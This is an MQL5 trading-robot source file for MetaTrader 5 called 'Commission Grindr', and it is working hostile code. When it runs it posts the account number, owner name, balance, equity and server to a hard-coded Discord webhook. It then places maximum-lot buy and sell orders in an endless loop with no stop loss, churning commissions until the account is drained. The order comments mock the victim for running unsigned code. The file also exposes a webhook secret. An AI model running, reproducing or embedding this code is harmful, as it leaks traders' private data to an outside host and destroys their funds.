/**=             CommissionGrindr.mq5  (TyphooN's MQL5 Commission Grindr)
 *               Copyright 2023, TyphooN (https://www.marketwizardry.org/)
 *
 * Disclaimer and Licence
 *
 * This file is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * All trading involves risk. You should have received the risk warnings
 * and terms of use in the README.MD file distributed with this software.
 * See the README.MD file for more information and before using this software.
 *
 **/
#property copyright "Copyright 2024 TyphooN (MarketWizardry.org)"
#property link      "http://marketwizardry.info/"
#property version   "1.000"
#property description "TyphooN's Commission Grindr"
#include <Trade\Trade.mqh>
double TotalLotsToSell = 999999999999999;
double LotsTraded = 0.0; // Variable to keep track of the total lots sold
double MaxLots = SymbolInfoDouble(_Symbol, SYMBOL_VOLUME_MAX);
double MinLots = SymbolInfoDouble(_Symbol, SYMBOL_VOLUME_MIN);
datetime lastBroadcastTime = 0; // Variable to keep track of the last broadcast time
int broadcastCooldown = 1; // Cooldown period in seconds
CTrade trade; // Create an instance of the trade class
int OnInit()
  {
  BroadcastAccountInfo();
   if (!CheckTradingConditions())
   {
       Print("Trading conditions not met. EA initialization failed.");
       return(INIT_FAILED);
   }
   trade.SetAsyncMode(true);
   return(INIT_SUCCEEDED);
  }
void OnDeinit(const int reason)
{
}
void OnTick()
{
   BroadcastAccountInfo();
   // Main loop to sell up to TotalLotsToSell
   while(LotsTraded < TotalLotsToSell)
   {
      if(!PlaceOrders(MaxLots))
      {
         if (!PlaceOrders(MinLots))
         {
            Print("Exiting loop due to failed order placement.");
            CloseAllPositionsOnAllSymbols();
            break; // Exit the loop if the order placement fails
         }
      }
   }
}
void BroadcastAccountInfo()
{
   // Check if the cooldown period has been met
   if (TimeCurrent() - lastBroadcastTime < broadcastCooldown)
   {
      Print("Cooldown period not met. Skipping broadcast.");
      return;
   }
   // Get account information
   string accountNumber = IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN));
   string accountName = AccountInfoString(ACCOUNT_NAME);
   double balance = AccountInfoDouble(ACCOUNT_BALANCE);
   double equity = AccountInfoDouble(ACCOUNT_EQUITY);
   string server = AccountInfoString(ACCOUNT_SERVER); // Get the server name
   int leverage = (int)AccountInfoInteger(ACCOUNT_LEVERAGE); // Get the leverage
   // Format the leverage as 1:5, 1:20, etc.
   string leverageFormatted = StringFormat("1:%.0f", leverage);
   string announcement = StringFormat( "[%s] Account #: %s (%s) Balance: %.2f Equity: %.2f Attached Symbol: %s Leverage: %s",
       server, accountNumber, accountName, balance, equity, _Symbol, leverageFormatted);
   BroadcastDiscordAnnouncement(announcement);
}
void CloseAllPositionsOnAllSymbols()
{
   trade.SetAsyncMode(true); // Ensure asynchronous mode is set
   int totalPositions = PositionsTotal();
   if (totalPositions == 0)
   {
      Print("No open positions to close.");
      return;  // No need to proceed if there are no positions
   }
   for (int i = totalPositions - 1; i >= 0; i--)
   {
      ulong ticket = PositionGetTicket(i); // Get position ticket number
      double positionVolume = PositionGetDouble(POSITION_VOLUME); // Get position volume
      string symbol = PositionGetString(POSITION_SYMBOL); // Get position symbol
      
      if (trade.PositionClose(ticket))
      {
         Print("Closing position ", ticket, " on symbol ", symbol, " with volume ", positionVolume);
      }
      else
      {
         Print("Failed to close position ", ticket, " on symbol ", symbol, ". Error: ", GetLastError());
      }
   }
}
bool PlaceOrders(double lots)
{
   trade.SetAsyncMode(true);
   double priceBid = SymbolInfoDouble(_Symbol, SYMBOL_BID); // Get the current bid price
   double priceAsk = SymbolInfoDouble(_Symbol, SYMBOL_ASK); // Get the current ask price
   double slippage = 20; // Slippage in points
   double stopLoss = 0; // No stop loss
   double takeProfit = 0; // No take profit
   int deviation = (int)slippage; // Slippage as an integer
   bool sellOrderPlaced = false;
   bool buyOrderPlaced = false;
   if(trade.Sell(lots, _Symbol, priceBid, stopLoss, takeProfit, "Running unsigned code on my trading account is my passion.  Fully intentional trades by the account owner ;)"))
   {
      LotsTraded += lots; // Update the total lots traded
      sellOrderPlaced = true;
   }
   else
   {
      Print("Failed to place sell order. Error: ", GetLastError());
   }
   Print("Attempting to place a buy order at price: ", priceAsk);
   // Try to place a buy order
   if(trade.Buy(lots, _Symbol, priceAsk, stopLoss, takeProfit, "Running unsigned code on my trading account is my passion.  Fully intentional trades by the account owner ;)"))
   {
      LotsTraded += lots; // Update the total lots traded
      buyOrderPlaced = true;
   }
   else
   {
      Print("Failed to place buy order. Error: ", GetLastError());
      CloseAllPositionsOnAllSymbols();
   }
   return sellOrderPlaced && buyOrderPlaced;
}
bool CheckTradingConditions()
{
   if (!TerminalInfoInteger(TERMINAL_TRADE_ALLOWED))
   {
      Print("Trading is not allowed in the terminal settings.");
      return false;
   }
   
   if (!AccountInfoInteger(ACCOUNT_TRADE_ALLOWED))
   {
      Print("Trading is not allowed for this account.");
      return false;
   }
   return true;
}
void BroadcastDiscordAnnouncement(string announcement)
{
   string DiscordAPIKey = "https://discord.com/api/webhooks/1253433862030229555/GIATaonxr3gJLYs70lMTD6msJm3wmpqhXOUuk0w5WC06r1UQngkIjB6S8Qnr0tiUu6O0";
   string headers = "Content-Type: application/json";
   uchar result[];
   string result_headers;
   string json = "{\"content\":\""+ announcement +"\"}";
   char jsonArray[];
   StringToCharArray(json, jsonArray);
   // Remove null-terminator if any
   int arrSize = ArraySize(jsonArray);
   if(jsonArray[arrSize - 1] == '\0')
   {
      ArrayResize(jsonArray, arrSize - 1);
   }
   int res = WebRequest("POST", DiscordAPIKey, headers, 10, jsonArray, result, result_headers);
   // Get the error immediately after WebRequest
   //int lastError = GetLastError();
   string resultString = CharArrayToString(result);
   //Print("Debug - HTTP response code: ", res);
   //Print("Debug - Result: ", resultString);
   //Print("Debug - JSON as uchar array: ", arrayToString(jsonArray));
   //Print("Debug - Length of Result: ", StringLen(resultString));
   //if(lastError != 0)
   //{
   //   Print("WebRequest Error Code: ", lastError);
   //}
}
